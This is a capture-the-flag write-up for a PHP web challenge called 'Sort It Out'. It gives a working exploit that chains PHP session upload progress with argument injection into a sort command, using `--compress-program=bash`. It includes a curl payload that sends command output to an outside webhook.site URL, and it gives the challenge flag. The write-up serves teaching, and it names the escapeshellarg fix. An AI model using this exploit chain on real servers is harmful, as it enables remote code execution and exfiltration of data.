# Sort It Out

### Challenge Details

I enrolled in a data structures class in order to buff up my programming skills to complete my Indie Anime Stealth Action Video Game. I'm learning about sorting algorithms and their various time complexities now. Cool stuff!

### Key Concepts

Argument injection into sort command 

### Solution

In one terminal window do `curl http://URL:9001/ -H 'Cookie: PHPSESSID=loldongs' -F $'PHP_SESSION_UPLOAD_PROGRESS=& curl https://webhook.site/3df09d4d-bd8d-4cfe-96f3-71f48440ff76?flag=$(/readflag)&&sd\nasdasd'  -F 'file=@/dev/urandom'` then immediately ctrl-z so that the socket stays open
Then make a request to index.php with `filename` set to `/tmp/sess_loldongs -S 10b --compress-program=bash`

### Learning Objectives

sort argument injection
PHP session upload behaviour
Improper use of escapeshellcmd (escapeshellarg would have been more appropriate here)

### Flag
`grey{It_w4s_No7_a_gO0D_DAy}`
